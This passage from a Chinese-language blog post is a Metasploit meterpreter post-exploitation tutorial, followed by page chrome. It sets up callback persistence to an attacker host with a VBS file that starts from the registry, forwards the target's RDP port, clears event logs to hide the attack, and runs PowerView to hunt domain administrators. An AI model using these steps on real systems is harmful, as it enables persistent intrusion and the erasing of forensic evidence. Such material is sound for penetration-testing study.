+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888</span><br><span class="line"><span class="comment">#自动连接192.168.100.158的8888端口</span></span><br><span class="line"><span class="comment">#缺点是容易被杀毒软件查杀</span></span><br><span class="line"><span class="comment">#然后它就在目标机新建了这个文件</span></span><br><span class="line"><span class="comment">#C:\Windows\TEMP\****.vbs</span></span><br><span class="line"><span class="comment">#并把该服务加入了注册表中，只要开机就会启动</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="portfwd端口转发"><a href="#portfwd端口转发" class="headerlink" title="portfwd端口转发"></a>portfwd端口转发</h6><p>portfwd是meterpreter提供的一种基本的端口转发</p>
+<p>porfwd可以反弹单个端口到本地，并且监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 9999 -r 192.168.100.158 -p 3389   </span><br><span class="line"><span class="comment">#将192.168.100.158的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span></span><br><span class="line">-l:   <span class="comment">#本地监听的端口，用于接收目标主机的端口反弹</span></span><br><span class="line">-p:   <span class="comment">#目标服务器的端口；</span></span><br><span class="line">add:  <span class="comment">#添加一个连接</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问本地的3389端口就可以连接到目标主机的3389端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:9999</span><br><span class="line"><span class="comment">#因为通过端口转发功能已经把3389的流量转发到本地的9999端口</span></span><br><span class="line"><span class="comment">#所以只要连接本地的9999端口就相当于连接了目标机器的3389端口</span></span><br></pre></td></tr></table></figure>
+
+<p>删除当前建立的连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd delet -l 9999 -r 192.168.100.158 -p 3389   </span><br><span class="line">delet:  <span class="comment">#删除一个连接</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="清除事件日志"><a href="#清除事件日志" class="headerlink" title="清除事件日志"></a>清除事件日志</h6><p>完成攻击操作之后，千万别忘了”打扫战场”</p>
+<p>所有操作都会被记录在目标系统的日志文件之中</p>
+<p>因此需要在完成攻击之后使用以下命令来清除事件日志</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev  <span class="comment">#清除事件日志</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="导入并执行PowerShell脚本"><a href="#导入并执行PowerShell脚本" class="headerlink" title="导入并执行PowerShell脚本"></a>导入并执行PowerShell脚本</h5><p>如果powershell脚本是用于域内信息收集的</p>
+<p>则获取到的权限用户需要是域用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br><span class="line"><span class="comment">#加载powershell功能</span></span><br><span class="line">powershell_import /root/PowerView.ps1</span><br><span class="line"><span class="comment">#导入powershell脚本，提前将该powershell脚本放到指定目录</span></span><br><span class="line">powershell_execute Get-NetDomain</span><br><span class="line"><span class="comment">#执行该脚本下的功能模块Get-domain，该模块用于获取域信息</span></span><br><span class="line"><span class="comment">#一个脚本下通常有多个功能模块</span></span><br><span class="line"><span class="comment">#获取当前用户所在域的名称</span></span><br><span class="line">powershell_execute Invoke-UserHunter</span><br><span class="line"><span class="comment">#该功能模块用于定位域管理员登录的主机</span></span><br><span class="line">powershell_execute Get-NetForest</span><br><span class="line"><span class="comment">#该模块用于定位域信息</span></span><br><span class="line">powershell_execute Invoke-EnumerateLocalAdmin</span><br><span class="line"><span class="comment">#枚举域中所有计算机上本地管理员组的成员</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="加载stdapi"><a href="#加载stdapi" class="headerlink" title="加载stdapi"></a>加载stdapi</h5><p>有时候虽然获取到了meterpreter</p>
+<p>但是执行一些命令会显示没有该命令</p>
+<p>这时可以执行 <strong>load stdapi</strong> 来加载</p>
+<p>这样就可以执行命令了</p>
+<h5 id="升级Session"><a href="#升级Session" class="headerlink" title="升级Session"></a>升级Session</h5><p>有时候，当收到的不是 <strong>meterpreter</strong> 类型的 <strong>session</strong> 的话</p>
+<p>可能不好操作</p>
+<p>可以执行命令 <strong>sessions -u id</strong> 来升级 <strong>session</strong></p>
+<p>执行该命令，默认调用的是</p>
+<p><strong>post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</strong> 模块</p>
+<h2 id="The-END"><a href="#The-END" class="headerlink" title="The END"></a><strong>The END</strong></h2><h2 id="Power-By-CoreYun"><a href="#Power-By-CoreYun" class="headerlink" title="Power By CoreYun"></a><strong>Power By CoreYun</strong></h2>
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2024/02/09/2023%E5%9B%9E%E9%A1%BE/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">2023回顾</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+    <div class="valine-container comments-container content-padding--primary soft-size--large soft-style--box">
+      <div id="valine_thread" class="valine-thread"></div>
+    </div>
+    <script type="text/javascript" src="//unpkg.com/leancloud-storage@3.15.0/dist/av-min.js"></script>
+    <script type="text/javascript" src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <script type="text/javascript">
+      new Valine({
+        el: "#valine_thread",
+        appId: "J3xpOlRRaKzcao8WNHL2sSMI-gzGzoHsz",
+        appKey: "lpdlnkN82ornqCfvH0i0LLsQ",
+        placeholder: "随便说点什么叭～",
+        avatar: "mp",
+        pageSize: 10,
+        lang: "zh-cn",
+        visitor: true,
+        recordIP: true,
+        enableQQ: false,
+        meta: ['nick', 'mail', 'link'],
+        requiredFields: ['nick'],
+        
+        // Bilibili 表情包插件
+        // 设置 Bilibili 表情包地址
+        emojiCDN: '//i0.hdslb.com/bfs/emote/', 
+        // 表情 title 和图片映射
+        emojiMaps: {
+            // 小黄脸
+            "2023": "fa6dda8b876ed38609de38aa604be5ad109b8591.png",
+            "足球": "f9157d9fa5ac3b8339cb8a8b7ad70eb40d4113c9.png",
+            "脱单doge": "bf7e00ecab02171f8461ee8cf439c73db9797748.png",
+            "微笑": "685612eadc33f6bc233776c6241813385844f182.png",
+            "口罩": "3ad2f66b151496d2a5fb0a8ea75f32265d778dd3.png",
+            "doge": "3087d273a78ccaff4bb1e9972e2ba2a7583c9f11.png",
+            "妙啊": "b4cb77159d58614a9b787b91b1cd22a81f383535.png",
+            "OK": "4683fd9ffc925fa6423110979d7dcac5eda297f4.png",
+            "星星眼": "63c9d1a31c0da745b61cdb35e0ecb28635675db2.png",
+            "辣眼睛": "35d62c496d1e4ea9e091243fa812866f5fecc101.png",
+            "吃瓜": "4191ce3c44c2b3df8fd97c33f85d3ab15f4f3c84.png",
+            "滑稽": "d15121545a99ac46774f1f4465b895fe2d1411c3.png",
+            "呲牙": "b5a5898491944a4268360f2e7a84623149672eb6.png",
+            "打call": "431432c43da3ee5aab5b0e4f8931953e649e9975.png",
+            "歪嘴": "4384050fbab0586259acdd170b510fe262f08a17.png",
+            "调皮": "8290b7308325e3179d2154327c85640af1528617.png",
+            "2022": "a783df2ce72952c44004007462324bde4b092a0c.png",
+            "虎年": "a062f5fa2bafe677e49b6963a2bbb11dd4fe1e11.png",
+            "豹富": "3d1dbe52ea16e12ff7b1c371196f728a4097fb33.png",
+            "嗑瓜子": "28a91da1685d90124cfeead74622e1ebb417c0eb.png",
+            "笑哭": "c3043ba94babf824dea03ce500d0e73763bf4f40.png",
+            "藏狐": "ba0937ef6f3ccca85e2e0047e6263f3b4da37201.png",
+            "脸红": "0922c375da40e6b69002bd89b858572f424dcfca.png",
+            "给心心": "1597302b98827463f5b75c7cac1f29ea6ce572c4.png",
+            "嘟嘟": "abd7404537d8162720ccbba9e0a8cdf75547e07a.png",
+            "哦呼": "362bded07ea5434886271d23fa25f5d85d8af06c.png",
+            "喜欢": "8a10a4d73a89f665feff3d46ca56e83dc68f9eb8.png",
+            "酸了": "92b1c8cbceea3ae0e8e32253ea414783e8ba7806.png",
+            "嫌弃": "de4c0783aaa60ec03de0a2b90858927bfad7154b.png",
+            "大哭": "2caafee2e5db4db72104650d87810cc2c123fc86.png",
+            "害羞": "9d2ec4e1fbd6cb1b4d12d2bbbdd124ccb83ddfda.png",
+            "疑惑": "b7840db4b1f9f4726b7cb23c0972720c1698d661.png",
+            "喜极而泣": "485a7e0c01c2d70707daae53bee4a9e2e31ef1ed.png",
+            "奸笑": "bb84906573472f0a84cebad1e9000eb6164a6f5a.png",
+            "笑": "81edf17314cea3b48674312b4364df44d5c01f17.png",
+            "偷笑": "6c49d226e76c42cd8002abc47b3112bc5a92f66a.png",
+            "惊讶": "f8e9a59cad52ae1a19622805696a35f0a0d853f3.png",
+            "捂脸": "6921bb43f0c634870b92f4a8ad41dada94a5296d.png",
+            "阴险": "ba8d5f8e7d136d59aab52c40fd3b8a43419eb03c.png",
+            "囧": "12e41d357a9807cc80ef1e1ed258127fcc791424.png",
+            "呆": "33ad6000d9f9f168a0976bc60937786f239e5d8c.png",
+            "抠鼻": "cb89184c97e3f6d50acfd7961c313ce50360d70f.png",
+            "大笑": "ca94ad1c7e6dac895eb5b33b7836b634c614d1c0.png",
+            "惊喜": "0afecaf3a3499479af946f29749e1a6c285b6f65.png",
+            "无语": "44667b7d9349957e903b1b62cb91fb9b13720f04.png",
+            "点赞": "1a67265993913f4c35d15a6028a30724e83e7d35.png",
+            "鼓掌": "895d1fc616b4b6c830cf96012880818c0e1de00d.png",
+            "尴尬": "cb321684ed5ce6eacdc2699092ab8fe7679e4fda.png",
+            "灵魂出窍": "43d3db7d97343c01b47e22cfabeca84b4251f35a.png",
+            "委屈": "d2f26cbdd6c96960320af03f5514c5b524990840.png",
+            "傲娇": "010540d0f61220a0db4922e4a679a1d8eca94f4e.png",
+            "疼": "905fd9a99ec316e353b9bd4ecd49a5f0a301eabf.png",
+            "冷": "cb0ebbd0668640f07ebfc0e03f7a18a8cd00b4ed.png",
+            "热": "4e58a2a6f5f1580ac33df2d2cf7ecad7d9ab3635.png",
+            "生病": "0f25ce04ae1d7baf98650986454c634f6612cb76.png",
+            "吓": "9c10c5ebc7bef27ec641b8a1877674e0c65fea5d.png",
+            "吐": "06946bfe71ac48a6078a0b662181bb5cad09decc.png",
+            "捂眼": "c5c6d6982e1e53e478daae554b239f2b227b172b.png",
+            "嘘声": "e64af664d20716e090f10411496998095f62f844.png",
+            "思考": "cfa9b7e89e4bfe04bbcd34ccb1b0df37f4fa905c.png",
+            "再见": "fc510306bae26c9aec7e287cdf201ded27b065b9.png",
+            "翻白眼": "eba54707c7168925b18f6f8b1f48d532fe08c2b1.png",
+            "哈欠": "888d877729cbec444ddbd1cf4c9af155a7a06086.png",
+            "奋斗": "bb2060c15dba7d3fd731c35079d1617f1afe3376.png",
+            "墨镜": "3a03aebfc06339d86a68c2d893303b46f4b85771.png",
+            "难过": "a651db36701610aa70a781fa98c07c9789b11543.png",
+            "撇嘴": "531863568e5668c5ac181d395508a0eeb1f0cda4.png",
+            "抓狂": "4c87afff88c22439c45b79e9d2035d21d5622eba.png",
+            "生气": "3195714219c4b582a4fb02033dd1519913d0246d.png",
+            "水稻": "d530fcaa5100ba12a17a79b55bad342d530c54e3.png",
+            "奶茶干杯": "d5a491990be551ce69f9660da948050df4eab331.png",
+            "汤圆": "93609633a9d194cf336687eb19c01dca95bde719.png",
+            "锦鲤": "643d6c19c8164ffd89e3e9cdf093cf5d773d979c.png",
+            "弹幕破百亿": "80891223ba023dff3141e377f4ea3b89918eb6a4.png",
+            "福到了": "5de5373d354c373cf1617b6b836f3a8d53c5a655.png",
+            "鸡腿": "c7860392815d345fa69c4f00ef18d67dccfbd574.png",
+            "雪花": "a41813c4edf8782047e172c884ebd4507ce5e449.png",
+            "视频卫星": "dce6fc7d6dfeafff01241924db60f8251cca5307.png",
+            "干杯": "8da12d5f55a2c7e9778dcc05b40571979fe208e6.png",
+            "黑洞": "e90ec4c799010f25391179118ccd9f66b3b279ba.png",
+            "爱心": "ed04066ea7124106d17ffcaf75600700e5442f5c.png",
+            "胜利": "b49fa9f4b1e7c3477918153b82c60b114d87347c.png",
+            "加油": "c7aaeacb21e107292d3bb053e5abde4a4459ed30.png",
+            "抱拳": "89516218158dbea18ab78e8873060bf95d33bbbe.png",
+            "响指": "1b5c53cf14336903e1d2ae3527ca380a1256a077.png",
+            "保佑": "fafe8d3de0dc139ebe995491d2dac458a865fb30.png",
+            "福": "802429a301ac5b35a0480d9526a070ce67cd8097.png",
+            "支持": "3c210366a5585706c09d4c686a9d942b39feeb50.png",
+            "拥抱": "41780a4254750cdaaccb20735730a36044e98ef3.png",
+            "跪了": "f2b3aee7e521de7799d4e3aa379b01be032698ac.png",
+            "怪我咯": "07cc6077f7f7d75b8d2c722dd9d9828a9fb9e46d.png",
+            "老鼠": "8e6fb491eb1bb0d5862e7ec8ccf9a3da12b6c155.png",
+            "牛年": "9275275ff1f2659310648221107d20bc4970f106.png",
+            "三星堆": "fc7dadaa6986e75b813aa26f3eff3281d5f1a6d1.png",
+            "洛天依": "9fe06f3594d9afaf4ee2b74770f1c3086ae0ba11.png",
+            "坎公骑冠剑_吃鸡": "c4248a7b6ab326d66c83fd1fb58f1a50f99df332.png",
+            "坎公骑冠剑_钻石": "0b97c7e50e0cc963370e62fbb9b55f51bbe7f8ab.png",
+            "坎公骑冠剑_无语": "80eba0ce64c3fc1279b4daede2f1979cb2380e78.png",
+            "来古-沉思": "4ee07ff03266d62b246be0b950bebb2abf3d997c.png",
+            "来古-呆滞": "9a70b365e523f2379f395031ceefcebb75a45903.png",
+            "来古-疑问": "032fdc0d9d9fe6334776f6c39518a959b73b98f4.png",
+            "来古-震撼": "8b40f228675602a317d32007de6b795c101135ec.png",
+            "来古-注意": "4b671ba32a2581cf40e5cd41c67b111eb8010de0.png",
+            "初音未来_大笑": "8e7f71cda83ce407b0684702983399f8ed982f17.png",
+            "原神_哇": "8188ddf95bace929d382c7a83214afde79d83bfc.png",
+            "原神_哼": "91ed33b74bc36873c3ac8b2648f70d7ab6d8ab78.png",
+            "原神_嗯": "8b0a87e414f453a29730b6e0f45ca61f2f898688.png",
+            "原神_欸嘿": "8fba438fcbe0550877b04efd768d857082307c5e.png",
+            "原神_喝茶": "1de5789fbb3526ef7823c54db7081790a38e7044.png",
+            "原神_生气": "90a38c34742899f8e84138ed55f56cad3ba611fb.png",
+            "保卫萝卜_白眼": "9fce63f38288700bf7be84f3be336cf895ba0902.png",
+            "保卫萝卜_笔芯": "5ff2ed5cb71b02010018cc5910ac7052a03769af.png",
+            "保卫萝卜_哭哭": "7d249f7c990111d3e2982f7477af15b7eb29cbd9.png",
+            "保卫萝卜_哇": "5f2370e561c32d841245f7b1aab2eef43aeb9544.png",
+            "保卫萝卜_问号": "41eb93f09fc4a4d0692a310e8a1f85ba60e96060.png",
+            "无悔华夏_不愧是你": "c58002c32ee78d45366e126f294cb3149dd64ac2.png",
+            "无悔华夏_吃瓜": "273dcff577551bafff4f1eae18561f871e73a6ba.png",
+            "无悔华夏_达咩": "cffab383f47bab7f6736ba9c8d6ac098113410d9.png",
+            "无悔华夏_点赞": "b0f2e8db405ec667c3e6aaabd7c15155b6ea8710.png",
+            "无悔华夏_好耶": "324cd79784aeb37dbf2f47f68bbe8ed5d01f975e.png",
+            "奥比岛_搬砖": "1fab697214918d91087373a999cc7ef8040ddf85.png",
+            "奥比岛_点赞": "fb0b476fe2ff30cd59385ea7d616627ac114161f.png",
+            "奥比岛_击爪": "35bba1bb8f164c5e844155548438248e6eaa8382.png",
+            "奥比岛_委屈": "fda155e7c33b40dbb94c24644e0635d47b6ef3cc.png",
+            "奥比岛_喜欢": "ed64e0c81ee194138bd9df30c65077ed978fb88c.png",
+            // tv_小电视
+            "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
+            "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
+            "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
+            "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
+            "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
+            "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
+            "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
+            "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
+            "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
+            "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
+            "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
+            "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
+            "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
+            "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
+            "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
+            "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png",
+            "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
+            "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
+            "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
+            "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
+            "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
+            "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
+            "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
+            "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
+            "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
+            "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
+            "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
+            "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
+            "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
+            "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
+            "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
+            "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
+            "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
+            "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
+            "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
+            "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
+            "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
+            "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
+            "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
+            "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
+            "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
+            "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
+            "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
+            "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
+            "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
+            "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
+            "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
+            "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
+            "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
+            "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
+            // ... 更多表情
+        }
+        
+      });
+    </script>
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="/images/yf.png" class="soft-size--round soft-style--box" alt="CoreYun">
+    
+    
+      <h2>CoreYun</h2>
+    
+    
+      <p>我有了你之后，运气变好了起来</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>6</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        6
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>欢迎来参观呀，小伙伴们~</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
